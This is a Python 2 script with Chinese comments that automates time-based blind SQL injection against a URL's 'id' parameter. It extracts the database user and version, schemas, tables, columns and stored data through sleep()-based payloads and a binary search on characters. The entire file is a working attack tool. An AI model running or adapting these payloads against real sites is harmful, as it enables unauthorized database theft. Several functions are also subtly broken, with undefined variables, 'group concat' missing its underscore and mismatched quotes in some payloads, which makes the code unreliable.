#coding=utf-8
import urllib2,requests,optparse

#载入rullib2,request模块
def request(URL):
	user_agent={'User-Agent':'Mozilla/5.0(Macintosh; Inter Max OS X 10_7_3) AppleWebKit/534.55.3(KHTML,like Gecko) Version/5.1.3 Safari/534.53.10'}
	#添加user.agent头
	req = urllib2.Request(URL,None,user_agent)
	#try捕获异常
	try:
		request = urllib2.urlopen(req,timeout=2)
	except Exception as e:
		return 'timeout'
	return request.read()

def data(url,i,z,a,data,databaseTable):
	while a:
		print "[+] Checking:%s \r"%i
		url_length = url+'?id=1+and+sleep(if((select+length(group concat('+str(data)+'))+from+'+str(database)+')='+str(i)+',5,0))'
		url_data = url+'?id=1+and+if(ascii(substring((group_concat('+str(data)+')+from+'+str(database)+'),'
		c,a = userdata(i,a,z,url_length,url_data)
		if a == False:
			print '[*]:',data+u'字段中的数据为'
			for i in range(len(c)):
				print '[*]:',c[i]
		i = i + 1

def line(url,i,z,a,table,database):
	while a:
		print"[+] Checking:%s \r" %i
		url_length = url+'?id=1+and+sleep(if((select+length(group concat(column_name))+from+information_schema.columns+where+table_schema="'+str(database)+'"+and+table_name="'+str(table)+'")='+str(i)+',5,0))'
		url_data = url+'?id=1+and+if(ascii(substring((select+group_concat(column_name)+from+information_schema.columns+where+table_schema="'+str(database)+')'+'"+and+table_name="'+str(table)+'"),'
		c,a = userdata(i,a,z,url_length,url_data)
		if a == False:
			print '[*]:',database+u'数据库中'+table+u'表中的字段为'
			for i in range(len(c)):
				print '[*]:',c[i]
		i = i + 1

def table(url,l,z,a,database):
	while a:
		print"[+] Checking:%s \r" %i
		url_length = url+'?id=1+and+sleep(if((select+length(group_concat(table_name))+from+information_schema.tables+where+table_schema="'+ str(database) +'")='+ str(i) +',5,0))'
		url_data = url+'?id=1+and+if(ascii(substring((select+group_concat(table_name)+from+information_schema.tables+where+table_schema="'+str(database)+'")=,'
		c,a = userdata(i,a,z,url_length,url_data)
		if a == False:
			print '[*]:',database+u'库中的表有'
			for i in range(len(c)):
				print '[*]:',c[i]
		i = i + 1

def database(url,i,z,a):
	while a:
		print"[+] Checking:%s \r" %i
		url_length = url+'?id=1+and+sleep(if((select+length(group_concat(schema_name))+from+information_schema.schemata)='+ str(i) +',5,0))'
		url_data = url+'?id=1+and+if(ascii(substring((select+group_concat(schema_name)+from+information_schema.schemata),'
		c,a = userdata(i,a,z,url_length,url_data)
		if a == False:
			print '[*]:',database+u'库中的表有'
			for i in range(len(c)):
				print '[*]:',c[i]
		i = i + 1

def version(url,i,z,a):
	while a:
		print"[+] Checking:%s \r" %i
		url_length = url+'?id=1+and+sleep(if((select+length(group_concat(user(),0x2c,version())))='+ str(i) +',5,0))'
		url_data = url+'?id=1+and+if(ascii(substring((select+group_concat(user(),0x2c,version())),'
		c,a = userdata(i,a,z,url_length,url_data)
		if a == False:
			print u'[*]:库中的用户有',c[0]
			print u'[*]:数据库的版本',c[1]
		i = i + 1




def userdata(i,a,z,url_length,url_data):
	html = request(url_length)
	verify = 'timeout'
	c = ''
	#print i,html
	if verify in html:
		print u"[+]数据长度为： %s"%i
		for x in range(i):
			x = x + 1
			start = 0
			end = 127
			while a:
				#利用二分法判断
				mid = (start+end)/2
				url_data = url_data + str(x) +',1))<'+ str(mid) +',sleep(2),1)'
				html = request(url_data)
				verify = 'timeout'
				if start == mid:
					z = z + chr(mid)
					break
				elif verify in html:
					end = mid
				else:
					start = mid
				#print start,end,mid,z
			print '[*]:',z
		c = z.split(',')
		a = False
	return c,a
	

if __name__ == '__main__':
	parser = optparse.OptionParser()
	parser.add_option("-u", dest="url", help=u"输入-u链接",action="store")
	parser.add_option("-d", dest="database", help=u"输入-d任意参数",action="store")
	parser.add_option("-t", dest="table", help=u"输入-t库名",action="store")
	parser.add_option("-l", dest="line", help=u"输入-d库名，-l表名",action="store")
	parser.add_option("-s", dest="data", help=u"输入-s字段，-t库名.表名",action="store")
	options, _ = parser.parse_args()
	if options.url:
		i,z,a = 0, '', True
		protocolOne = "http://"
		protocolTwo = "https://"
		if protocolOne in options.url:
			url = options.url
		elif protocolTwo in options.url:
			url = options.url
		else:
			url = "http://" + options.url
		if options.data and options.table:
			data(url,i,z,a,options.data,options.table)
		elif options.line and options.database:
			line(url,i,z,a,options.line,options.database)
		elif options.database:
			database(url,i,z,a)
		elif options.table:
			table(url,i,z,a,options.table)
		else:
			version(url,i,z,a)
	else:
		parser.print_help()
